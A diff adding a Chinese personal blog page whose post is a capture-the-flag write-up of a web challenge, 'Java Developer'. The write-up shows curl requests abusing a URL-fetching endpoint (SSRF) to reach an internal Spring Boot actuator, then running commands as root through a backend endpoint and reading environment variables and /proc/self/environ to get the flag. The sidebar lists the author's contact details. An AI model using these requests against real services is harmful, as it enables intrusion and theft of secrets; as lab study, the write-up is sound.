@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>白白毛毛</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="/js/main.js" defer></script>
+  <link rel="stylesheet" href="/css/_custom.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+
+<div class="sidebar">
+    <img src="/images/avatar.jpg" class="avatar" alt="avatar">
+    <h1 class="site-title">白白毛毛</h1>
+
+    <nav class="nav">
+        <a href="/">首页</a>
+        <a href="/archives">归档</a>
+    </nav>
+
+    
+<!-- ===== Custom Contact Section ===== -->
+<div class="contact-section">
+    <p class="contact-intro">If you want find me, please:</p>
+    <div class="contact-item">
+        <img src="/images/qq.png" alt="QQ" class="contact-icon">
+        <span>729626523</span>
+    </div>
+    <div class="contact-item">
+        <img src="/images/GitHub.png" alt="GitHub" class="contact-icon">
+        <span>yu-star-cyrene</span>
+    </div>
+    <div class="contact-item">
+        <img src="/images/email.jpg" alt="Gmail" class="contact-icon">
+        <span>y19350026593@gmail.com</span>
+    </div>
+</div>
+<!-- ===== End Custom Contact Section ===== -->
+<div id="post-list">
+        <article>
+    <h1>PS:感觉可以做一个</h1>
+    <p class="date">2025-11-11</p>
+    <div class="article-content"><style>
+/* 恢复代码块为等宽字体，但字号与正文一致，避免视觉突变 */
+:root { --post-font-size: 1rem; }
+
+/* 内联代码和键盘输入样式：等宽、与正文同大小 */
+code, kbd, tt {
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "DejaVu Sans Mono", monospace !important;
+  font-size: var(--post-font-size) !important;
+  font-weight: normal !important;
+  background: rgba(0,0,0,0.03);
+  padding: .06em .22em;
+  border-radius: 4px;
+}
+
+/* 多行代码块保留等宽并优化换行与可读性 */
+pre, pre code, .highlight, .hljs {
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "DejaVu Sans Mono", monospace !important;
+  font-size: var(--post-font-size) !important;
+  line-height: 1.6 !important;
+  white-space: pre-wrap !important;     /* 保留换行同时避免横向滚动过宽 */
+  word-break: break-word !important;
+  color: inherit !important;
+  background: rgba(0,0,0,0.02);
+  padding: .6em .8em !important;
+  border-radius: 6px;
+  overflow: auto !important;
+}
+
+/* 如果之前覆盖过更具体的类（如 .language-xxx），也一并恢复 */
+.language-plaintext,
+[class*="language-"],
+.token {
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "DejaVu Sans Mono", monospace !important;
+  font-size: var(--post-font-size) !important;
+}
+</style>
+
+<pre><code class="language-bash">在看之前，提醒，需要自己理解一下题目需要你干什么，虽然这是我之前做的，但一些知识点感觉还是很重要，所以就心血来潮写了。
+靶场web题：&quot;Java Developer&quot; (1)
+![alt text](/images/QQ20251111-175359.png)
+
+打开题目所给的靶机，只有这么一句话根本没有下文，一开始很难有思路的，用工具扫一下。
+
+开始扫描......
+http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/robots.txt
+
+看到这有个robots.txt，打开看一下
+User-agent: *
+Disallow: /backend/*
+Disallow: /actuator/*
+Allow: /front/spider
+
+text
+
+/backend/和/actuator/都被禁止了，说明这两个里面肯定有东西。
+/front/spider 又允许这个，或许这个可以是一个跳板。
+
+我们先测试一下：
+C:\Users\G1731&gt;curl http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider
+{&quot;timestamp&quot;:&quot;2025-11-11T09:59:53.995+0000&quot;,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:&quot;No message available&quot;,&quot;path&quot;:&quot;/front/front/spider&quot;}
+我们访问的是/front/spider，可它的反馈确是/front/front/spider，这说明一开始所有访问都是在这个/front/下进行的，被固定住了。
+
+我们这次正确访问一下：
+
+bash
+C:\Users\G1731&gt;curl http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider
+尝试 &lt;a href=&quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider?url=https://www.baidu.com&quot;&gt;点击此处
+它返回了一个链接，看不出什么意思，我们再访问：
+
+bash
+C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=https://www.baidu.com&quot;
+&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type content=text/html;charset=utf-8&gt;...（百度首页HTML内容）...
+这叽里呱啦的一大堆，完全不懂意思，但我们只要知道一点，这个地址是百度，而它在url后面，说明我们就可以利用这个向服务器发出请求，并得到反馈。
+
+再扫一下端口，发现80是开放的，外网端口开放且能发出请求，那我们再试一试内网：
+
+bash
+C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/&quot;
+{&quot;timestamp&quot;:&quot;2025-11-11T10:09:34.482+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;HTTP请求失败，响应码: 404&quot;,&quot;path&quot;:&quot;/front/spider&quot;}
+
+C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://127.0.0.1:8080/&quot;
+{&quot;timestamp&quot;:&quot;2025-11-11T10:09:35.337+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;HTTP请求失败，响应码: 404&quot;,&quot;path&quot;:&quot;/front/spider&quot;}
+有请求说明，8080端口是开的，而且有内网。
+
+我们试一下用内网访问刚才几个禁止：
+
+bash
+C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator&quot;
+{&quot;_links&quot;:{&quot;self&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator&quot;,&quot;templated&quot;:false},&quot;health&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/health&quot;,&quot;templated&quot;:false},&quot;health-path&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/health/{*path}&quot;,&quot;templated&quot;:true},&quot;info&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/info&quot;,&quot;templated&quot;:false},&quot;mappings&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/mappings&quot;,&quot;templated&quot;:false}}}
+
+C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend&quot;
+Nice! You will definitely succeed.
+运气很好，一下子就肯定了我们的猜想，方向是对的，那之后呢，其实还是不知道具体要怎么去操作，去看了点csdn，https://blog.csdn.net/qq_43290288/article/details/106296283
+
+发现这个actuator很厉害，可以直接在控制台发现所有监控点的映射信息，那不就说明可以查看所有东西吗，https:///images/QQ20251111-181803.png
+
+bash
+C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator/mappings&quot;
+{&quot;contexts&quot;:{&quot;application&quot;:{&quot;mappings&quot;:{&quot;dispatcherServlets&quot;:{&quot;dispatcherServlet&quot;:[{&quot;handler&quot;:&quot;Actuator web endpoint &#39;health&#39;&quot;,&quot;predicate&quot;:&quot;{GET /actuator/health, produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}&quot;,&quot;details&quot;:{&quot;handlerMethod&quot;:{&quot;className&quot;:&quot;org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler&quot;,&quot;name&quot;:&quot;handle&quot;,&quot;descriptor&quot;:&quot;(Ljavax/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;&quot;},&quot;requestMappingConditions&quot;:{&quot;consumes&quot;:[],&quot;headers&quot;:[],&quot;methods&quot;:[&quot;GET&quot;],&quot;params&quot;:[],&quot;patterns&quot;:[&quot;/actuator/health&quot;],&quot;produces&quot;:[{&quot;mediaType&quot;:&quot;application/vnd.spring-boot.actuator.v3+json&quot;,&quot;negated&quot;:false},{&quot;mediaType&quot;:&quot;application/vnd.spring-boot.actuator.v2+json&quot;,&quot;negated&quot;:false},{&quot;mediaType&quot;:&quot;application/json&quot;,&quot;negated&quot;:false}]}}},...（完整的mappings响应）...
+什么都来了，但什么也看不懂，这个时候就要请ai老师帮帮忙了。
+
+从 mappings 响应中，我们找到了所有后端接口：
+
+🔥 BackendController 接口：
+/backend/file - 文件读取功能
+/backend/whoami - 命令执行功能
+/backend/env - 环境变量功能
+/backend - 基础接口（返回 &quot;Nice! You will definitely succeed.&quot;）
+
+一针见血，我们就用这几个端口测试一下：
+
+bash
+C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/flag&quot;
+离$FLAG很近了哦
+
+C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/proc/self/environ&quot;
+离$FLAG很近了哦
+
+C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=whoami&quot;
+root
+
+C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=env&quot;
+HOSTNAME=a31cee05bb1eJAVA_HOME=/usr/local/openjdk-8PWD=/HOME=/rootLANG=C.UTF-8FLAG=G0D{e03bef26-6922-4157-abed-8e979286cf98}SHLVL=1PATH=/usr/local/openjdk-8/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binJAVA_VERSION=8u342_=/usr/local/openjdk-8/bin/java
+Great！ G0D{e03bef26-6922-4157-abed-8e979286cf98} 一下子就拿到flag了。
+
+说实话，我一开始做的时候看了无数遍离$FLAG很近了哦就是找不到flag，还以为做不出来呢。
+
+咕咕嘎嘎！！！
+
+
+
+---
+
+版权声明：本文由白白毛毛创作，转载请注明出处。
+</code></pre>
+</div>
+</article>
+
+    </div>
+</div>
+
+<div class="content-area">
+    <div class="content-wrapper">
+        <div id="post-content">
+            <p class="hint">点击左侧文章标题查看内容</p>
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
